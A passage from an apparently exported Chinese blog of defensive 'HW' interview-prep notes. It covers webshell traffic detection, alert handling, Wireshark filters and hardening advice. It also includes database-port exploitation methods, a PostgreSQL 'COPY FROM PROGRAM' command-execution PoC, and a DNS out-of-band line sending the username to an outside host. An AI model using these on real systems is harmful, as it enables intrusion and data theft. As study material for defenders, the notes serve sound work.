title=\"常见webshell流量体征\"></a>常见webshell流量体征</h3><ul>\n<li>异常流量：Webshell的流量通常会显示为异常流量，因为攻击者通常会通过Webshell上传和下载文件、执行命令等操作，这些操作都会产生大量不正常的流量。</li>\n<li>带有特定字符或字符串：Webshell可能会带有特定字符或字符串，如“eval(base64_decode(”，这些字符或字符串用于解码Webshell的命令或脚本，攻击者可能会使用这些字符或字符串来隐藏Webshell。</li>\n<li>频繁访问：Webshell的访问可能会比正常的用户访问频率更高，这是因为攻击者需要不断访问Webshell以获取控制目标服务器的权限。</li>\n<li>长时间运行的连接：Webshell的流量可能会包含长时间运行的连接，这是因为攻击者通常会保持Webshell的连接以便在需要时执行更多的操作。</li>\n<li>异常文件：Webshell可能会通过上传和下载文件来执行操作，因此出现异常文件或文件类型也可能是Webshell的流量体征。</li>\n</ul>\n<h3 id=\"常用数据库默认端口及漏洞\"><a href=\"#常用数据库默认端口及漏洞\" class=\"headerlink\" title=\"常用数据库默认端口及漏洞\"></a>常用数据库默认端口及漏洞</h3><ul>\n<li><p>89 端口（ldap）安全漏洞：未授权访问 、弱口令<br>利用方式：通过LdapBrowser工具直接连入。</p>\n</li>\n<li><p>1433 端口（Mssql）安全漏洞：弱口令、暴力破解<br>利用方式：差异备份getshell、SA账户提权等</p>\n</li>\n<li><p>1521 端口（Oracle）安全漏洞：弱口令、暴力破解<br>利用方式：通过弱口令&#x2F;暴力破解进行入侵。</p>\n</li>\n<li><p>3306 端口（MySQL）安全漏洞：弱口令、暴力破解<br>利用方式：利用日志写入webshell、udf提权、mof提权等。</p>\n</li>\n<li><p>5432 端口（ PostgreSQL）安全漏洞：弱口令、高权限命令执行<br>利用方式：攻击者通过弱口令获取账号信息，连入postgres中，可执行系统命令。PoC参考： DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM ‘id’; SELECT * FROM cmd_exec;</p>\n</li>\n<li><p>5984 端口（CouchDB）安全漏洞：垂直权限绕过、任意命令执行<br>利用方式：通过构造数据创建管理员用户，使用管理员用户登录，构造恶意请求触发任意命令执行。后台访问：http:&#x2F;&#x2F;:5984&#x2F;_utils</p>\n</li>\n<li><p>6379 端口（Redis）安全漏洞：未授权访问<br>利用方式：绝对路径写webshell 、利用计划任务执行命令反弹shell、公私钥认证获取root权限、主从复制RCE等。</p>\n</li>\n<li><p>9200 端口（elasticsearch）安全漏洞：未授权访问、命令执行</p>\n</li>\n</ul>\n<h3 id=\"目标ip是邮件服务器要怎么处理\"><a href=\"#目标ip是邮件服务器要怎么处理\" class=\"headerlink\" title=\"目标ip是邮件服务器要怎么处理\"></a>目标ip是邮件服务器要怎么处理</h3><ol>\n<li>检查邮件服务器是否正常运行：您可以通过尝试连接到邮件服务器并发送一封电子邮件来检查邮件服务器是否正常运行。如果邮件服务器无法连接或无法发送电子邮件，则可能需要检查邮件服务器的配置或网络设置。</li>\n<li>检查安全设置：邮件服务器需要设置安全措施以保护电子邮件和用户数据，如防火墙、反病毒软件和邮件过滤器等。您可以检查这些设置是否已启用或需要进行更新。</li>\n<li>更新邮件服务器软件：如果您的邮件服务器软件已经过时，可能需要更新到最新版本以修复可能存在的安全漏洞和错误。</li>\n<li>监控邮件服务器流量：监控邮件服务器的流量可以帮助您识别和防止未经授权的访问或攻击。您可以使用日志分析工具或流量监控工具来监控邮件服务器的流量，并检查是否存在异常活动。</li>\n<li>增强安全措施：除了基本的安全措施，您还可以考虑增强邮件服务器的安全措施，如强密码策略、多因素身份验证和加密等。这些措施可以帮助保护邮件服务器免受恶意</li>\n</ol>\n<h3 id=\"目的ip是114-114-114-114端口是53需要封禁吗\"><a href=\"#目的ip是114-114-114-114端口是53需要封禁吗\" class=\"headerlink\" title=\"目的ip是114.114.114.114端口是53需要封禁吗\"></a>目的ip是114.114.114.114端口是53需要封禁吗</h3><h3 id=\"群里面遇到exe可执行程序怎么处理\"><a href=\"#群里面遇到exe可执行程序怎么处理\" class=\"headerlink\" title=\"群里面遇到exe可执行程序怎么处理\"></a>群里面遇到exe可执行程序怎么处理</h3><ol>\n<li>不要下载或运行未知来源的可执行程序。如果你不确定该程序是否安全，请询问发送者或其他群组成员。</li>\n<li>使用杀毒软件进行扫描。如果你已经下载了该程序并想运行它，可以使用杀毒软件进行扫描，以确保它不包含任何恶意软件。</li>\n<li>隔离该文件。如果你怀疑该程序可能会造成破坏，请将其隔离在一个安全的位置，以防止其对你的计算机系统造成任何影响。</li>\n<li>通知管理员。如果你认为该程序可能会对其他群组成员造成威胁，请及时通知管理员或相关人员，并让他们采取适当的措施来处理该问题。</li>\n<li>虚拟机打开</li>\n</ol>\n<h3 id=\"遇到远控木马告警如何处理\"><a href=\"#遇到远控木马告警如何处理\" class=\"headerlink\" title=\"遇到远控木马告警如何处理\"></a>遇到远控木马告警如何处理</h3><ol>\n<li>立即断开网络连接。为了防止该木马进一步攻击计算机或服务器，你应该立即断开网络连接，包括断开无线网络和网线连接等。</li>\n<li>扫描计算机或服务器。使用安全软件对计算机或服务器进行全面扫描，以检测和清除远控木马。确保使用更新的杀毒软件，以提高检测和清除恶意软件的能力。</li>\n<li>更改密码。更改所有重要帐户的密码，例如电子邮件、在线银行、社交媒体等。确保密码是复杂且难以猜测的，建议使用密码管理器。</li>\n<li>及时备份数据。备份所有重要数据，包括文件、文档、照片等，以防止数据丢失。</li>\n<li>更新操作系统和软件。确保计算机或服务器上的操作系统和所有软件都是最新的，以填补可能的安全漏洞。</li>\n<li>通知安全管理员。如果你在工作环境中发现远控木马，应立即通知安全管理员或信息安全团队，并遵循公司的安全政策和流程。</li>\n</ol>\n<h3 id=\"cs\"><a href=\"#cs\" class=\"headerlink\" title=\"cs\"></a>cs</h3><p>一款渗透测试神器</p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/zzwwhhpp/article/details/111773395\" >https://blog.csdn.net/zzwwhhpp/article/details/111773395<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"wireshark过滤条件\"><a href=\"#wireshark过滤条件\" class=\"headerlink\" title=\"wireshark过滤条件\"></a>wireshark过滤条件</h3><p>ip.src eq 192.168.1.107 or ip.dst eq 192.168.1.107</p>\n<p>或者</p>\n<p>ip.addr eq 192.168.1.107 &#x2F;&#x2F; 都能显示来源IP和目标IP</p>\n<p>tcp.port eq 80 &#x2F;&#x2F; 不管端口是来源的还是目标的都显示</p>\n<p>tcp.port &#x3D;&#x3D; 80</p>\n<p>tcp.port eq 2722</p>\n<p>tcp.port eq 80 or udp.port eq 80</p>\n<p>tcp.dstport &#x3D;&#x3D; 80 &#x2F;&#x2F; 只显tcp协议的目标端口80</p>\n<p>tcp.srcport &#x3D;&#x3D; 80 &#x2F;&#x2F; 只显tcp协议的来源端口80</p>\n<p> udp.port eq 15000</p>\n<p> 过滤端口范围</p>\n<p>tcp.port &gt;&#x3D; 1 and tcp.port &lt;&#x3D; 80</p>\n<p>th.dst &#x3D;&#x3D; A0:00:00:04:C5:84 &#x2F;&#x2F; 过滤目标mac</p>\n<p>eth.src eq A0:00:00:04:C5:84 &#x2F;&#x2F; 过滤来源mac</p>\n<p>eth.dst&#x3D;&#x3D;A0:00:00:04:C5:84</p>\n<p>eth.dst&#x3D;&#x3D;A0-00-00-04-C5-84</p>\n<p>eth.addr eq A0:00:00:04:C5:84 &#x2F;&#x2F; 过滤来源MAC和目标MAC都等于A0:00:00:04:C5:84的</p>\n<p>http.request.method &#x3D;&#x3D; “GET”</p>\n<p>http.request.method &#x3D;&#x3D; “POST”</p>\n<p>http.request.uri &#x3D;&#x3D; “&#x2F;img&#x2F;logo-edu.gif”</p>\n<p>http contains “GET”</p>\n<p>http contains “HTTP&#x2F;1.”</p>\n<h3 id=\"shiro反序列化漏洞\"><a href=\"#shiro反序列化漏洞\" class=\"headerlink\" title=\"shiro反序列化漏洞\"></a>shiro反序列化漏洞</h3><p>1.1.3 漏洞原理</p>\n<p>  Apache Shiro框架提供了记住我的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过相关信息进行序列化，然后使用AES加密（对称），最后再使用Base64编码处理。服务端在接收cookie时：</p>\n<p>攻击者可以使用Shiro的默认密钥构造恶意序列化对象进行编码来伪造用户的Cookie，服务端反序列化时触发漏洞，从而执行命令</p>\n<h3 id=\"蚁剑流量特征\"><a href=\"#蚁剑流量特征\" class=\"headerlink\" title=\"蚁剑流量特征\"></a>蚁剑流量特征</h3><p>1.默认的 user-agent 请求头是 antsword xxx（可修改）</p>\n<p> 2.蚁剑的正文内容用URL加密，解密后流量最中明显的特征为ini_set(“display_errors”,”0”);</p>\n<h3 id=\"勒索病毒传播方式有哪些\"><a href=\"#勒索病毒传播方式有哪些\" class=\"headerlink\" title=\"勒索病毒传播方式有哪些\"></a>勒索病毒传播方式有哪些</h3><ul>\n<li>网站挂马：用户浏览挂有木马病毒的网站，上网终端计算机系统极可能被植入木马并感染上勒索病毒。</li>\n<li>邮件传播：攻击者通过利用当前热门字样，在互联网上撒网式发送垃圾邮件、钓鱼邮件，一旦收件人点开带有勒索病毒的链接或附件，勒索病毒就会在计算机后台静默运行，实施勒索。</li>\n<li>漏洞传播：攻击者通过计算机操作系统和应用软件的漏洞攻击并植入病毒，最典型的案例是2017年在国内泛滥的WannaCry大规模勒索事件，攻击者正是利用微软445端口协议漏洞，进行感染传播网内计算机。</li>\n<li>捆绑传播：攻击者将勒索病毒与其他软件尤其是盗版软件、非法破解软件、激活工具进行捆绑，从而诱导用户点击下载安装，并随着宿主文件的捆绑安装进而感染用户的计算机系统。</li>\n<li>介质传播：攻击者通过提前植入或通过交叉使用感染等方式将携有勒索病毒的U盘、光盘等介质进行勒索病毒的移动式传播。</li>\n</ul>\n<h3 id=\"log4j漏洞\"><a href=\"#log4j漏洞\" class=\"headerlink\" title=\"log4j漏洞\"></a>log4j漏洞</h3><p>该漏洞的主要原因是log4j在日志输出中，未对字符合法性进行严格的限制，执行了JNDI协议加载的远程恶意脚本，从而造成RCE</p>\n<h3 id=\"wireshark抓到数据包之后你怎么去分析\"><a href=\"#wireshark抓到数据包之后你怎么去分析\" class=\"headerlink\" title=\"wireshark抓到数据包之后你怎么去分析\"></a>wireshark抓到数据包之后你怎么去分析</h3><h3 id=\"redis-mongodb端口号\"><a href=\"#redis-mongodb端口号\" class=\"headerlink\" title=\"redis mongodb端口号\"></a>redis mongodb端口号</h3><p>redis 6379   </p>\n<p>mongoDB 27017</p>\n<h3 id=\"天眼探针有什么功能\"><a href=\"#天眼探针有什么功能\" class=\"headerlink\" title=\"天眼探针有什么功能\"></a>天眼探针有什么功能</h3><h3 id=\"天眼能否检索网络日志\"><a href=\"#天眼能否检索网络日志\" class=\"headerlink\" title=\"天眼能否检索网络日志\"></a>天眼能否检索网络日志</h3><h3 id=\"struct2命令执行漏洞\"><a href=\"#struct2命令执行漏洞\" class=\"headerlink\" title=\"struct2命令执行漏洞\"></a>struct2命令执行漏洞</h3><p>Struts2的action:、redirect:和redirectAction:前缀参数在实现其功能的过程中使用了Ognl表达式，并将用户通过URL提交的内容拼接入Ognl表达式中，从而造成攻击者可以通过构造恶意URL来执行任意Java代码，进而可执行任意命令</p>\n<h3 id=\"如果目的端口为-x-X-x-x-操作系统win7或者win8，检索语句要怎么写\"><a href=\"#如果目的端口为-x-X-x-x-操作系统win7或者win8，检索语句要怎么写\" class=\"headerlink\" title=\"如果目的端口为: x.X.x.x,操作系统win7或者win8，检索语句要怎么写\"></a>如果目的端口为: x.X.x.x,操作系统win7或者win8，检索语句要怎么写</h3><h3 id=\"怎么写模糊查询告警类型为写入文件的检索语句\"><a href=\"#怎么写模糊查询告警类型为写入文件的检索语句\" class=\"headerlink\" title=\"怎么写模糊查询告警类型为写入文件的检索语句\"></a>怎么写模糊查询告警类型为写入文件的检索语句</h3><h3 id=\"如果出现两条相同的sql注入告警你会怎么处理\"><a href=\"#如果出现两条相同的sql注入告警你会怎么处理\" class=\"headerlink\" title=\"如果出现两条相同的sql注入告警你会怎么处理\"></a>如果出现两条相同的sql注入告警你会怎么处理</h3><h3 id=\"如果出现蠕虫病毒告警，如何处理\"><a href=\"#如果出现蠕虫病毒告警，如何处理\" class=\"headerlink\" title=\"如果出现蠕虫病毒告警，如何处理\"></a>如果出现蠕虫病毒告警，如何处理</h3><h3 id=\"php命令执行函数\"><a href=\"#php命令执行函数\" class=\"headerlink\" title=\"php命令执行函数\"></a>php命令执行函数</h3><p><strong>system()，passthru()，exec()，pcntl_exec()，shell_exec()，popen()&#x2F;proc_popen()，反引号 &#96;&#96;</strong></p>\n<h3 id=\"冰蝎流量特征\"><a href=\"#冰蝎流量特征\" class=\"headerlink\" title=\"冰蝎流量特征\"></a>冰蝎流量特征</h3><p>Accept: application&#x2F;json, text&#x2F;javascript, <em>&#x2F;</em>; q&#x3D;0.01</p>\n<p>Content-type: Application&#x2F;x-www-form-urlencoded</p>\n<p>冰蝎设置了10种User-Agent,每次连接shell时会随机选择一个进行使用。</p>\n<p>冰蝎与webshell建立连接的同时，javaw也与目的主机建立tcp连接，每次连接使用本地端口在49700左右，每连接一次，每建立一次新的连接，端口就依次增加。</p>\n<p>$post&#x3D;Decrypt(file_get_contents(“php:&#x2F;&#x2F;input”));</p>\n<h3 id=\"哥斯拉流量特征\"><a href=\"#哥斯拉流量特征\" class=\"headerlink\" title=\"哥斯拉流量特征\"></a>哥斯拉流量特征</h3><p>Accept为text&#x2F;html, image&#x2F;gif, image&#x2F;jpeg, *; q&#x3D;.2, <em>&#x2F;</em>; q&#x3D;.2</p>\n<p>cookie中分号结尾</p>\n<p>和请求体一样，请求响应体也分两个格式，base64编码的和原始加密raw数据。如果请求体采用base64编码，响应体返回的也是base64编码的数据。在使用base64编码时，响应体会出现一个很明显的固定特征。这个特征是客户端和服务端编写的时候引入的。</p>\n<p>从代码可以看到会把一个32位的md5字符串按照一半拆分，分别放在base64编码的数据的前后两部分。整个响应包的结构体征为：md5前十六位+base64+md5后十六位。<br>从响应数据包可以明显看到这个特征，检测时匹配这个特征可以达到比较高的检出率，同时也只可以结合前面的一些弱特征进行检查，进一步提高检出率。因为md5的字符集范围在只落在0123456789ABCDEF范围内，因此很容易去匹配，正则匹配类似于(?i:[0-9A-F]{16})[\\w+&#x2F;]{4,}&#x3D;?&#x3D;?(?i:[0-9A-F]{16})。需要注意的是md5需要同时匹配字母大小写两种情况，因为在JAVA版webshell响应中为大写字母，在PHP版中为小写字母。</p>\n<h3 id=\"发现有入侵攻击，查看主机的哪些日志\"><a href=\"#发现有入侵攻击，查看主机的哪些日志\" class=\"headerlink\" title=\"发现有入侵攻击，查看主机的哪些日志\"></a>发现有入侵攻击，查看主机的哪些日志</h3><p>&#x2F;var&#x2F;log&#x2F;</p>\n<h3 id=\"如何防范反序列化漏洞\"><a href=\"#如何防范反序列化漏洞\" class=\"headerlink\" title=\"如何防范反序列化漏洞\"></a>如何防范反序列化漏洞</h3><p>防范反序列化漏洞的方法主要包括以下几点：</p>\n<ol>\n<li>输入过滤：在接收用户输入时，进行有效性验证和输入过滤，避免恶意输入。</li>\n<li>对象序列化前加密：对即将进行序列化的对象中的敏感数据或者方法进行加密处理，避免序列化后数据被篡改。</li>\n<li>签名校验：利用数字签名技术，在序列化和反序列化的过程中添加签名机制，校验序列化对象是否经过篡改。</li>\n<li>更新库文件：定期更新使用的序列化库文件，避免因为库文件中的漏洞而导致反序列化漏洞的产生。</li>\n<li>减少依赖第三方类库：减少依赖第三方类库的情况，避免由于第三方类库中的漏洞而导致反序列化漏洞的产生。</li>\n<li>最小化序列化：精简序列化对象中的属性，避免不必要的属性被序列化，从而降低反序列化的风险。</li>\n</ol>\n<p>以上是防范反序列化漏洞的一些基本方案。此外，如果使用的是Java语言，还可以通过Java Security Manager来控制反序列化操作的权限。在开发项目时，应该尽可能地避免使用Java反序列化操作，或者在进行序列化和反序列化操作时，更加谨慎的写好对应的代码和相关配置。</p>\n<h3 id=\"天眼上显示多个不同url的SQL注入告警，可能是什么原因？\"><a href=\"#天眼上显示多个不同url的SQL注入告警，可能是什么原因？\" class=\"headerlink\" title=\"天眼上显示多个不同url的SQL注入告警，可能是什么原因？\"></a>天眼上显示多个不同url的SQL注入告警，可能是什么原因？</h3><p>可能是网站存在多个不同的漏洞点，或者攻击者利用了不同的注入方式和参数来尝试注入，导致出现多个不同的SQL注入告警。此外，也有可能是天眼扫描器在扫描过程中出现了误报或者漏报情况，需要对告警进行仔细分析和验证。建议及时修复漏洞点，防范SQL注入等安全威胁。</p>\n<h3 id=\"我们在天眼上遇到文件上传告警时，应急响应的流程是怎样的？-同一台资产多次发出同一个告警，可能的原因？\"><a href=\"#我们在天眼上遇到文件上传告警时，应急响应的流程是怎样的？-同一台资产多次发出同一个告警，可能的原因？\" class=\"headerlink\" title=\"我们在天眼上遇到文件上传告警时，应急响应的流程是怎样的？ 同一台资产多次发出同一个告警，可能的原因？\"></a>我们在天眼上遇到文件上传告警时，应急响应的流程是怎样的？ 同一台资产多次发出同一个告警，可能的原因？</h3><p>应对文件上传告警的应急响应流程一般包括如下步骤：</p>\n<ol>\n<li>确认告警情况：查看告警详细信息，包括文件类型、大小、上传时间、上传者、上传路径、上传方式、来源IP等，判断是否存在风险。</li>\n<li>暂停上传功能：对于存在风险的上传功能，需要暂停上传功能，防止攻击者持续上传。</li>\n<li>验证漏洞点：对上传功能进行全面测试，确认漏洞点，包括上传参数的类型、限制、验证等。</li>\n<li>修复漏洞点：根据漏洞点的验证结果，提供相应的解决方案和实施措施，比如对上传文件进行类型、大小、扩展名、后缀名等多个方面的限制。</li>\n<li>监测告警情况：在上传功能修复后，需对文件上传行为进行全面监测，查看是否仍然存在风险。</li>\n</ol>\n<p>同一台资产多次发出同一个告警可能是以下原因：</p>\n<ol>\n<li>真实存在的漏洞：同一漏洞点被攻击者利用多次，导致多次告警。</li>\n<li>系统误报：扫描器或监测设备存在误报，由于告警下发频繁，导致同一漏洞多次告警。</li>\n<li>前置设备异常：网络设备、WAF等前置设备异常，导致同一个请求被多次拦截，产生多次告警。</li>\n</ol>\n<p>在排查告警原因时，需要进行仔细分析和判断，以确认是否存在真实风险。需要及时对真实漏洞进行修复和防范，对于误报和异常情况则需要针对性的进行排查和修复。</p>\n<h3 id=\"linux临时文件位置\"><a href=\"#linux临时文件位置\" class=\"headerlink\" title=\"linux临时文件位置\"></a>linux临时文件位置</h3><p>在Linux系统中，临时文件通常放置在以下几个目录中：</p>\n<ol>\n<li>&#x2F;tmp目录：该目录是Linux系统中最常用的临时文件目录之一，任意用户都可以在该目录中创建、修改、删除文件。该目录下的文件在系统重启后会被清空。</li>\n<li>&#x2F;var&#x2F;tmp目录：该目录和&#x2F;tmp目录类似，不同之处在于该目录下的文件在系统重启后不会被清空，需要手动删除。</li>\n<li>&#x2F;dev&#x2F;shm目录：该目录是一个ramfs文件系统，在内存中创建一个文件系统，并且把该文件系统挂载到&#x2F;dev&#x2F;shm目录下。该目录也可以作为临时文件目录使用，因为文件在内存中创建，所以读写速度较快。</li>\n</ol>\n<p>除了上述目录之外，还有一些应用程序会自己创建临时文件目录，例如Apache创建的临时文件夹为&#x2F;var&#x2F;cache&#x2F;httpd，Nginx创建的临时文件目录为&#x2F;var&#x2F;run&#x2F;nginx&#x2F;client_body_temp。</p>\n<p>需要注意的是，在使用临时文件时，应尽可能使用系统默认的临时文件目录，避免用在不安全或者没有权限控制的目录。临时文件的权限也应该设置为仅能被创建者和目录管理员使用，并尽可能定期清理，以降低系统安全风险。</p>\n<h3 id=\"使用天眼遇到sql告警怎么处理\"><a href=\"#使用天眼遇到sql告警怎么处理\" class=\"headerlink\" title=\"使用天眼遇到sql告警怎么处理\"></a>使用天眼遇到sql告警怎么处理</h3><p>处理天眼上的SQL告警，一般需要按照以下步骤进行：</p>\n<ol>\n<li>核实告警：对收到的告警首先进行核实，查看告警详情以确认告警是否为真实漏洞。</li>\n<li>定位漏洞：确认告警存在后，需要进行漏洞定位，以查找漏洞原因和具体位置，检查SQL查询参数、输入过滤、数据库配置等方面。</li>\n<li>修复漏洞：根据定位得到的漏洞内容，进行相应的安全加固和漏洞修复，比如优化SQL查询语句、加强输入过滤、修复数据库配置等。</li>\n<li>验证修复结果：在修复漏洞后，需要再次测试系统以验证修复结果，确保系统安全性得到提高。</li>\n<li>预防未来漏洞：在修复漏洞之后，需要对SQL注入漏洞进一步加强防范和监测，避免类似漏洞重演。</li>\n</ol>\n<p>需要注意的是，上述过程应该配合严格的访问控制和身份认证机制，并进行安全审计来保证系统的安全性。另外，如果使用天眼监测到SQL注入漏洞的话，可以结合其他安全工具如WAF来对系统进行进一步防御。通过不断加强安全防护链的研发和落地，能让系统安全得到有力地提升。</p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"🐶✌️","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"HW-prepare\"><a href=\"#HW-prepare\" class=\"headerlink\" title=\"HW prepare\"></a>HW prepare</h1><h3 id=\"对hw的理解\"><a href=\"#对hw的理解\" class=\"headerlink\" title=\"对hw的理解\"></a>对hw的理解</h3><p>我个人觉得护网行动是国家重视网络安全的一种体现，目的是发现企业政府安全问题并解决，提供安全能力</p>\n<p>hw分为蓝队防守方和红队攻击方</p>\n<h3 id=\"hw防守人员组成\"><a href=\"#hw防守人员组成\" class=\"headerlink\" title=\"hw防守人员组成\"></a>hw防守人员组成</h3><p>监控组：监控组主要就是对WAF、IPS等安全设备进行7*24小时监控、派发、跟踪、反馈安全威胁</p>\n<p>研判组：研判组主要是技术支撑，对于监控组发现的攻击行为进行技术研判</p>\n<p>网络处置组：网络处置组主要职责就是发现攻击时在防火墙上对攻击方进行IP封锁，溯源等等</p>\n<p>应用处置组：应用处置组主要就是对发现的攻击和漏洞进行风险处置、安全加固</p>\n<h3 id=\"安全产品了解哪些\"><a href=\"#安全产品了解哪些\" class=\"headerlink\" title=\"安全产品了解哪些\"></a>安全产品了解哪些</h3><ul>\n<li>防火墙一般不属于区域的边界，如数据中心中核心区域和业务区域的边界防火墙、园区网络边界防火墙等，主要做保证边界安全</li>\n<li>抗D也叫抗DDOS设备即流量清洗设备，一般部署与网络最外侧，防止大规模僵尸网络入侵，内部有一套完整的机制可以区分哪些流量是用户正常流量和僵尸网络流量，可以保障数据中心可以提供完整的数据中心服务；</li>\n<li>负载均衡设备分为全局负载均衡（GLB）和链路负载均衡（LLB）以及服务器负载均衡（SLB）。GLB可以保障用户可以访问就近的数据中心提供的服务资源，LLB可以保障流量的出栈负载均衡和入栈负载均衡。SLB可以保障服务器对外服务的时候负载更平均、可靠；</li>\n<li>WAF即<a class=\"link\"   href=\"https://cloud.tencent.com/product/waf?from=20065&from_column=20065\" >web应用防火墙<i class=\"fas fa-external-link-alt\"></i></a>，可以防止网站挂马保障网页安全，部署在WEB服务器区域；</li>\n<li>数据库审计设备是把对数据库所有的操作记录下来，方便后期溯源审计和责任明确，部署在运维管理区域或者数据库审计区域均可。</li>\n<li>漏扫即<a class=\"link\"   href=\"https://cloud.tencent.com/product/vds?from=20065&from_column=20065\" >漏洞扫描<i class=\"fas fa-external-link-alt\"></i></a>就是给系统做体检，可以扫描出操作系统漏洞、数据库漏洞、WEB漏洞，方便管理员对暴露出的漏洞情况进行安全加固。一般部署在安全检测区域。</li>\n<li>网页防篡改一般和WAF配合使用，保护web网页不被黑客篡改，如果被篡改了，那结果仍然可以显示篡改前的正常页面，在政府行业用的最多。一般是软件直接安装在WEB服务器上。</li>\n<li>上网行为管理设备说白了是可以记录员工的上网行为，包括浏览网页的地址、检索内容、聊天记录等，一般旁挂于核心交换机。</li>\n<li>堡垒机即运维审计设备，所有涉及到登录设备（如服务器、存储、交换机、防火墙等ICT产品）的操作都要先登录到堡垒机统一登录入口。同时所有的操作都会被审计下来，方便后期溯源取证。</li>\n</ul>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"pdf解析有没有可能存在xxe\"><a href=\"#pdf解析有没有可能存在xxe\" class=\"headerlink\" title=\"pdf解析有没有可能存在xxe\"></a>pdf解析有没有可能存在xxe</h3><p>是的，PDF 解析器可能存在 XXE（XML 外部实体注入）漏洞。这是因为 PDF 格式支持内嵌 XML 数据，并且一些 PDF 解析器可能会对这些数据进行处理，其中可能包含 XML 实体。</p>\n<h3 id=\"http协议里面method和data\"><a href=\"#http协议里面method和data\" class=\"headerlink\" title=\"http协议里面method和data\"></a>http协议里面method和data</h3><p>方法\t描述\t是否包含主体<br>GET\t从服务器获取一份文档\t否<br>HEAD\t只从服务器获取文档的首部\t否<br>POST\t向服务器发送带要处理的数据\t是<br>PUT\t将请求的主体部分存储在服务器上\t是<br>TRACE\t对可能经过代理服务器传送到服务器上去的报文进行追踪\t否<br>OPTIONS\t决定可以在胀务器上执行哪些方法\t否<br>DELETE\t从服务器上删除一份文档\t否</p>\n<h3 id=\"威胁情报告警如何判断\"><a href=\"#威胁情报告警如何判断\" class=\"headerlink\" title=\"威胁情报告警如何判断\"></a>威胁情报告警如何判断</h3><h3 id=\"网络攻击类的告警要怎么判断\"><a href=\"#网络攻击类的告警要怎么判断\" class=\"headerlink\" title=\"网络攻击类的告警要怎么判断\"></a>网络攻击类的告警要怎么判断</h3><h3 id=\"sql注入的修复方式\"><a href=\"#sql注入的修复方式\" class=\"headerlink\" title=\"sql注入的修复方式\"></a>sql注入的修复方式</h3><ul>\n<li>SQL语句预编译</li>\n<li>针对SQL输入内容进行限制、过滤 &#x2F;&#x2F;目前使用WAF对这一块进行处理</li>\n<li>针对提交的关键数据进行转义 ，比如\\select</li>\n<li>关闭错误信息输出 ，因为有些错误返回信息，会返回物理路径、数据库版本信息等</li>\n<li>数据库权限严格控制 ，不同级别的用户，只能进行相应级别权限的操作</li>\n<li>敏感信息严格加密处理</li>\n</ul>\n<h3 id=\"网络攻击的方向来自哪三个方向\"><a href=\"#网络攻击的方向来自哪三个方向\" class=\"headerlink\" title=\"网络攻击的方向来自哪三个方向\"></a>网络攻击的方向来自哪三个方向</h3><h3 id=\"如何判断攻击是不是误报\"><a href=\"#如何判断攻击是不是误报\" class=\"headerlink\" title=\"如何判断攻击是不是误报\"></a>如何判断攻击是不是误报</h3><h3 id=\"DNS外带存在哪些漏洞\"><a href=\"#DNS外带存在哪些漏洞\" class=\"headerlink\" title=\"DNS外带存在哪些漏洞\"></a>DNS外带存在哪些漏洞</h3><ul>\n<li><p>sql盲注</p>\n</li>\n<li><p>XSS</p>\n</li>\n<li><p>命令执行</p>\n</li>\n<li><p>windows可以查询主机用户名等</p>\n<p>ping %USERNAME%.XXX.CEYE.IO</p>\n</li>\n<li><p>xxe</p>\n</li>\n<li><p>ssrf</p>\n</li>\n</ul>\n<h3 id=\"什么是攻防演练\"><a href=\"#什么是攻防演练\" class=\"headerlink\" title=\"什么是攻防演练\"></a>什么是攻防演练</h3><p>网络安全实战攻防演练是以获取指定目标系统（标靶系统）的管理权限为目标的攻防演练，由攻防领域经验丰富的红队专家组成攻击队，在保障业务系统稳定运行的前提下，采用“不限攻击路径，不限制攻击手段”的贴合实战方式，而形成的“有组织”的网络攻击行动。攻防演练通常是在真实网络环境下对参演单位目标系统进行全程可控、可审计的实战攻击，拟通过演练检验参演单位的安全防护和应急处置能力，提高网络安全的综合防控能力。</p>\n<h3 id=\"怎么判断socket代理\"><a href=\"#怎么判断socket代理\" class=\"headerlink\" title=\"怎么判断socket代理\"></a>怎么判断socket代理</h3><blockquote>\n<p>通过 Websocket 的 bufferedAmount 来探测用户是否采用来代理</p>\n<ol>\n<li>Client 通过 Websocket 与 Server 建立连接</li>\n<li>Server 监听到 connect 事件后，将本次 TCP 的 window size 设置为 0，这也就意味着 Client 无法继续将数据包传给 server</li>\n<li>Client 使用 websocket.send()持续发送几个包</li>\n<li>在 Client 上观察 websocket.bufferedAmount 值，如果过了一会，这个值一直在增大，说明无代理，否则存在代理<br>为啥可以通过这个值来判断呢？这是因为代理工具一般不会转发 TCP 的设置，也就是说，开启了代理的 Client 发出的包会被代理给吃掉</li>\n</ol>\n</blockquote>\n<h3 id=\"一句话木马\"><a href=\"#一句话木马\" class=\"headerlink\" 